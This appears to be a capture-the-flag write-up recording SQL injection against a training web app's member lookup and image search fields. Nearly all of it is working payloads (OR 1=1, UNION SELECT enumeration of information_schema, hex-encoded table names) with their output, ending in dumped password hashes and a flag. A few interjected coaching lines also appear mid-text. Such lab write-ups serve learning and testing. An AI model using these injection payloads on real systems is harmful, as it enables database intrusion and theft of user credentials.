# Via MEMBERES FIELD

list members all: 
> 1 OR 1=1

list database tables :
> 1 UNION SELECT table_name,2 FROM information_schema.tables

list database columns :

> 1 UNION SELECT column_name,2 FROM information_schema.columns

You are listing tables from information_schema :

> 1 UNION SELECT table_name,2 
FROM information_schema.tables 
WHERE table_schema = database()

```
ID: 1 UNION SELECT table_name,2  FROM information_schema.tables  WHERE table_schema = database() 
First name: one
Surname : me
ID: 1 UNION SELECT table_name,2  FROM information_schema.tables  WHERE table_schema = database() 
First name: users
Surname : 2
```

list users :

> 1 UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'

> 1 UNION SELECT table_name,2 FROM information_schema.tables

> 1 UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name LIKE 0x7573657273 

0x7573657273  == "users" 

list users table columns :
> 1 UNION SELECT first_name,Commentaire FROM users 


> 1 UNION SELECT first_name,concat(last_name,Commentaire,countersign) FROM users WHERE first_name LIKE 0x466c6167 

First name: Flag
Surname : GetTheDecrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28


flag in sh256 without !:  
> 59a7f515c31c489524d2c93aa4a27b6732cf248d664389990fa8c1be8af00291


# VIA IMAGE SEARCH:

ID: 1 OR 1=1# 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_
ID: 1 OR 1=1# 
Title: 42 !
Url : https://fr.wikipedia.org/wiki/Fichier:42
ID: 1 OR 1=1# 
Title: Google
Url : https://fr.wikipedia.org/wiki/Logo_de_Go
ID: 1 OR 1=1# 
Title: Earth
Url : https://en.wikipedia.org/wiki/Earth#/med
ID: 1 OR 1=1# 
Title: Hack me ?
Url : borntosec.ddns.net/images.png

The "Hack me ?" entry is a nice hint that the flag is waiting in that table. What do you get from the ORDER BY test?


> 0 UNION SELECT table_name, 2 FROM information_schema.tables--

ID: 0 UNION SELECT table_name, 2 FROM information_schema.tables-- 
Title: 2
Url : INNODB_BUFFER_POOL_STATS
ID: 0 UNION SELECT table_name, 2 FROM information_schema.tables-- 
Title: 2
Url : INNODB_BUFFER_PAGE
ID: 0 UNION SELECT table_name, 2 FROM information_schema.tables-- 
Title: 2
Url : INNODB_SYS_FOREIGN
ID: 0 UNION SELECT table_name, 2 FROM information_schema.tables-- 
Title: 2
Url : db_default
ID: 0 UNION SELECT table_name, 2 FROM information_schema.tables-- 
Title: 2
Url : users
ID: 0 UNION SELECT table_name, 2 FROM information_schema.tables-- 
Title: 2
Url : guestbook
ID: 0 UNION SELECT table_name, 2 FROM information_schema.tables-- 
Title: 2
Url : list_images

Keep the SQLi going (don't drop this)
The "Hack me ?" title is almost certainly intentionally planted in the DB as a hint. The real flag is probably still in a users table. Don't get sidetracked from:

> 0 UNION SELECT schema_name, 2 FROM information_schema.schemata--
ID: 0 UNION SELECT schema_name, 2 FROM information_schema.schemata-- 
Title: 2
Url : information_schema
ID: 0 UNION SELECT schema_name, 2 FROM information_schema.schemata-- 
Title: 2
Url : Member_Brute_Force
ID: 0 UNION SELECT schema_name, 2 FROM information_schema.schemata-- 
Title: 2
Url : Member_Sql_Injection
ID: 0 UNION SELECT schema_name, 2 FROM information_schema.schemata-- 
Title: 2
Url : Member_guestbook
ID: 0 UNION SELECT schema_name, 2 FROM information_schema.schemata-- 
Title: 2
Url : Member_images
ID: 0 UNION SELECT schema_name, 2 FROM information_schema.schemata-- 
Title: 2
Url : Member_survey
> 0 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users--
ID: 0 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users-- 
Title: 2b3366bcfd44f540e630d4dc2b9b06d9
Url : Je pense, donc je suis
ID: 0 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users-- 
Title: 60e9032c586fb422e2c16dee6286cf10
Url : Aamu on iltaa viisaampi.
ID: 0 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users-- 
Title: e083b24a01c483437bcf4a9eea7c1b4d
Url : Dublin is a city of stories and secrets.
ID: 0 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users-- 
Title: 5ff9d0165b4f92b14994e5c685cdce28
Url : Decrypt this password -> then lower all the char. Sh256 on it and it's good !